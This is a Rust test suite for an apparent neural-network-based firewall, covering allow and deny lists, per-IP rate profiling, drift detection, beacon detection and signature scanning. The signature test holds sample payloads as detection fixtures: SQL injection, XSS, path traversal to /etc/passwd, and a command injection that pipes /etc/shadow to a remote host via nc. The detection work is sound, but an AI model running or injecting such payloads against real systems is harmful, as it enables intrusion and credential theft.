use std::net::{IpAddr, Ipv4Addr};

use snn_firewall::{
    channel_names, ConnEvent, EventMeta, EventSource, Firewall, FirewallPolicy, JsonlSource,
    MemoryAudit, MetaWindow, MitigationKind, RecordingPolicySink, RuleSubject, SlowTick,
    SourceProfiles, Verdict,
};
use snn_mesh::DetectorConfig;

const TICK: u64 = 1000;

fn ip(n: u8) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(10, 0, 0, n))
}

fn ev(ts: u64, src: IpAddr) -> ConnEvent {
    ConnEvent {
        ts_ms: ts,
        tenant: "t-a".into(),
        src_ip: src,
        payload_bytes: 500,
        header_bytes: 400,
        meta: Default::default(),
        payload: None,
    }
}

fn fw() -> Firewall<RecordingPolicySink, MemoryAudit> {
    Firewall::new(
        DetectorConfig {
            delta_threshold: 5.0,
            spike_current: 200.0,
            initial_weight: 80.0,
            window: 10,
            anomaly_threshold: 1,
            ..DetectorConfig::for_metrics(&channel_names())
        },
        FirewallPolicy {
            anomaly_threshold: 2,
            action_ladder: vec![MitigationKind::Drop],
            ttl_ms: 5_000,
            cooldown_ms: 0,
            ..Default::default()
        },
        &[
            10.0, 2.0, 5.0, 500.0, 400.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 10.0, 0.0, 0.0, 10.0,
        ],
        RecordingPolicySink::default(),
        MemoryAudit::default(),
    )
}

fn normal_window(fw: &mut Firewall<RecordingPolicySink, MemoryAudit>, w: u64) {
    for i in 0..5u8 {
        for k in 0..2u64 {
            fw.inspect(&ev(w * TICK + (i as u64 * 2 + k) * 100, ip(i + 1)))
                .unwrap();
        }
    }
}

/// Static policy short-circuits behavioral enforcement both ways.
#[test]
fn static_policy_short_circuits() {
    let mut f = fw();
    f.static_policy.deny.insert(ip(9), true);
    f.static_policy.allow.insert(ip(7));

    // Denied IP: immediate deny, rule 0 (static marker).
    assert_eq!(
        f.inspect(&ev(0, ip(9))).unwrap(),
        Verdict::Denied { rule: 0 }
    );

    // Allowlisted IP floods without generating a rule.
    for w in 0..14 {
        for k in 0..200u64 {
            f.inspect(&ev(w * TICK + k * 4, ip(7))).unwrap();
        }
    }
    assert!(
        f.sink_mut().applied.is_empty(),
        "allowlisted IP must never draw a rule"
    );
}

/// Per-source profiles catch a botnet where no IP dominates the window:
/// 60 rotating IPs each send 2/s normally, then one spikes its own rate.
#[test]
fn profiles_catch_rotating_spiker() {
    let mut profiles = SourceProfiles::new(3.0, 10_000, TICK);
    // Learn: 60 IPs at 2 events/tick.
    for w in 0..10u64 {
        for i in 0..60u8 {
            for k in 0..2u64 {
                profiles.observe(&ev(
                    w * TICK + k * 400,
                    IpAddr::V4(Ipv4Addr::new(9, 9, 9, i)),
                ));
            }
        }
    }
    // Established talker 9.9.9.42 bursts to 40 events in one tick —
    // aggregate req_rate barely moves, but its own baseline breaks hard.
    let spiker = IpAddr::V4(Ipv4Addr::new(9, 9, 9, 42));
    for k in 0..40u64 {
        profiles.observe(&ev(10 * TICK + k * 20, spiker));
    }
    // The breach surfaces when the next tick rolls the window — collect
    // hits from w11 and w12 events.
    let mut hits = Vec::new();
    for w in 11..13u64 {
        for i in 0..60u8 {
            if let Some(ip) = profiles.observe(&ev(w * TICK, IpAddr::V4(Ipv4Addr::new(9, 9, 9, i))))
            {
                hits.push(ip);
            }
        }
    }
    assert!(hits.contains(&spiker), "per-source spike went unnoticed");
}

/// SlowTick: a drift that stays under the per-tick delta threshold
/// accumulates into a slow-window breach.
#[test]
fn slow_tick_catches_gradual_drift() {
    let mut slow = SlowTick::new(60, 2.0, 6);
    // 100 ticks of stable req_rate ~10 → baseline tightens.
    for _ in 0..100 {
        slow.push(&fv(&[
            10.0, 2.0, 5.0, 500.0, 400.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 10.0, 0.0, 0.0, 10.0,
        ]));
    }
    // Slow ramp: +0.3/tick — each delta under threshold, but the slow
    // mean walks off the baseline.
    let mut hits = Vec::new();
    for t in 0..200 {
        let mut v = vec![
            10.0 + t as f32 * 0.3,
            2.0,
            5.0,
            500.0,
            400.0,
            0.0,
            0.0,
            0.0,
            0.0,
        ];
        hits.extend(slow.push(&fv(&v)));
        v.clear();
    }
    assert!(hits.contains(&0), "gradual drift never flagged");
}

fn fv(values: &[f32]) -> snn_firewall::FeatureVector {
    snn_firewall::FeatureVector {
        start_ms: 0,
        values: values.to_vec(),
        top_src: None,
        jitter: 0.0,
        mean_gap_ms: 0.0,
    }
}

/// MetaWindow channels + JsonlSource round-trip with meta fields.
#[test]
fn meta_channels_and_ingest() {
    let mut mw = MetaWindow::default();
    let mut e = ev(0, ip(1));
    e.meta = EventMeta {
        dst_port: 443,
        proto: 6,
        error: false,
        ..Default::default()
    };
    mw.observe(&e);
    e.meta = EventMeta {
        dst_port: 53,
        proto: 17,
        error: true,
        ..Default::default()
    };
    mw.observe(&e);
    let [ent, err, tcp, ..] = mw.values();
    assert!((ent - 100.0).abs() < 1e-2, "2 equal ports → entropy 1×100");
    assert!((err - 50.0).abs() < 1e-2);
    assert!((tcp - 50.0).abs() < 1e-2);

    let line = serde_json::to_string(&e).unwrap() + "\n";
    let mut src = JsonlSource(line.as_bytes());
    let back = src.next_event().unwrap();
    assert_eq!(back.meta.dst_port, 53);
    assert!(back.meta.error);
    assert!(src.next_event().is_none());
}

/// Profiles fire inside the live engine — a per-IP burst that the
/// aggregate window tolerates still earns an Ip rule.
#[test]
fn engine_profiles_emit_ip_rule() {
    let mut f = fw();
    // Settle baselines on normal traffic.
    for w in 0..10 {
        normal_window(&mut f, w);
    }
    // ip(3) alone doubles its own rate for several windows — the
    // aggregate (10 ev/s → 12) stays under delta threshold, but its
    // per-source profile breaks.
    let mut ruled = false;
    for w in 10..40 {
        for i in 0..5u8 {
            let n = if i == 2 { 8 } else { 2 };
            for k in 0..n {
                f.inspect(&ev(w * TICK + (i as u64 * 8 + k) * 60, ip(i + 1)))
                    .unwrap();
            }
        }
        if f.sink_mut()
            .applied
            .iter()
            .any(|r| r.subject == RuleSubject::Ip(ip(3)))
        {
            ruled = true;
            break;
        }
    }
    assert!(ruled, "per-source burst earned no Ip rule");
}

/// Per-metric threshold override: a delta below the global threshold
/// fires when the channel is set hair-trigger.
#[test]
fn per_metric_threshold_override() {
    use snn_encode::DeltaModulator;
    let mut dm = DeltaModulator::new(&[10.0], 5.0, 200.0);
    dm.set_threshold(0, 0.5);
    let f = dm.encode(&[11.0]); // diff 1.0 < 5.0 global
    assert_eq!(f.up[0], 200.0, "per-metric override didn't fire");
    // Baseline ratcheted by the *override*, not the global.
    assert!((dm.baselines()[0] - 10.5).abs() < 1e-4);
}

/// Beacon detector: regular cadence = machine traffic → Ip rule.
#[test]
fn beacon_cadence_flags_and_rules() {
    use snn_firewall::Beacons;
    let mut b = Beacons::new(0.15, 6);
    // Perfectly regular 100ms gaps.
    let mut hit = None;
    for k in 1..10u64 {
        if let Some(ip) = b.observe(&ev(k * 100, ip(1))) {
            hit = Some(ip);
        }
    }
    assert_eq!(hit, Some(ip(1)));
    // Jittered gaps stay clean.
    let mut b2 = Beacons::new(0.15, 6);
    for (k, g) in [40u64, 900, 120, 800, 55, 1000, 300, 77].iter().enumerate() {
        assert!(b2.observe(&ev(*g * (k as u64 + 1), ip(2))).is_none());
    }
}

/// Blocklist import feeds the static deny layer end-to-end.
#[test]
fn blocklist_import_denies() {
    let mut f = fw();
    let feed = "# feed\n10.0.0.9\n\n1.2.3.4 # inline comment\ngarbage\n";
    let n = f.import_blocklist(feed.lines().map(|l| l.to_string()));
    assert_eq!(n, 2);
    assert_eq!(
        f.inspect(&ev(0, ip(9))).unwrap(),
        Verdict::Denied { rule: 0 }
    );
    assert_eq!(
        f.inspect(&ev(0, "1.2.3.4".parse().unwrap())).unwrap(),
        Verdict::Denied { rule: 0 }
    );
}

/// All 7 meta channels present and sane.
#[test]
fn meta_seven_channels() {
    let mut mw = MetaWindow::default();
    let mut e = ev(0, ip(1));
    e.meta = EventMeta {
        dst_port: 443,
        proto: 6,
        error: false,
        method: 2, // POST
        path_len: 50,
        ua_id: 7,
        payload_entropy: 80,
        ..Default::default()
    };
    mw.observe(&e);
    let v = mw.values();
    assert_eq!(v.len(), 9);
    assert!((v[0] - 0.0).abs() < 1e-4); // 1 port → entropy 0
    assert!((v[3] - 100.0).abs() < 1e-4); // all-POST window
    assert!((v[4] - 50.0).abs() < 1e-4); // mean path 50
    assert!((v[5] - 100.0).abs() < 1e-4); // 1 UA / 1 event
    assert!((v[6] - 80.0).abs() < 1e-4);
}

/// Jittered beacon evades CV but not the dominant-bucket path:
/// gaps 100±40ms all land in log2 buckets 6,7 → share ≥ 0.7 flags.
#[test]
fn jittered_beacon_still_flags() {
    use snn_firewall::Beacons;
    let mut b = Beacons::new(0.15, 6); // CV never triggers at ±40%
    let gaps = [
        60u64, 140, 90, 110, 75, 130, 95, 105, 80, 125, 100, 115, 70, 120,
    ];
    let mut ts = 0u64;
    let mut hit = None;
    for g in gaps {
        ts += g;
        if let Some(ip) = b.observe(&ev(ts, ip(1))) {
            hit = Some(ip);
        }
    }
    assert_eq!(hit, Some(ip(1)), "jittered beacon escaped detection");
}

/// Signature scan: producer-side content matcher → wire bitmask.
#[test]
fn signature_scan_categories() {
    use snn_firewall::Signatures;
    assert_eq!(Signatures::scan(b"' OR 1=1 --") & 1, 1);
    assert_eq!(Signatures::scan(b"<script>alert(1)</script>") & 2, 2);
    assert_eq!(Signatures::scan(b"../../../../etc/passwd") & 4, 4);
    assert_eq!(Signatures::scan(b"; cat /etc/shadow | nc 1.2.3.4 9") & 8, 8);
    assert_eq!(Signatures::scan(b"Mozilla sqlmap/1.4") & 16, 16);
    assert_eq!(Signatures::scan(b"GET /index.html HTTP/1.1"), 0);
}

/// sig_rate channel fires when a producer tags payloads.
#[test]
fn sig_channel_drives_detection() {
    let mut mw = MetaWindow::default();
    let mut e = ev(0, ip(1));
    e.meta.sig_hits = 1;
    e.meta.ja3 = 0xdeadbeef;
    mw.observe(&e);
    let v = mw.values();
    assert_eq!(v.len(), 9);
    assert!((v[7] - 100.0).abs() < 1e-4, "sig_rate should be 100%");
    assert!((v[8] - 100.0).abs() < 1e-4, "ja3 diversity 1/1");
}
